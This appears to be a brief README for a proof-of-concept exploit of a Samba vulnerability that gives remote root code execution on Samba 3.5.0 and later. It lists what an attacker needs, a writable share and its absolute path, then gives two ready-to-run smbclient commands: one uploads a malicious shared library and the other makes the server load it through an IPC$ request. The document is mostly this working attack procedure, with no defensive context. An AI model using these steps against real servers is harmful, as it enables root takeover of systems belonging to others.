# Impact
Remote root arbitrary code execution on Samba 3.5.0+

# Prerequisites
* You must have access to one writable share
* You must know the absolute path to the share on the host
* * when the [metasploit module](https://github.com/rapid7/metasploit-framework/pull/8450) is released, it will attempt to brute force some common paths (e.g. Synology

# How to

1.  Upload shared library to writable samba share.

```bash
smbclient //127.0.0.1/writable_dir -U $USER -c "put sonasty.so"
```

2.  Trigger execution by IPC$ connection `get` request

```bash
smbclient  //127.0.0.1/IPC$ -U $USER -c "get /abs/path/to/sonasty.so"
```
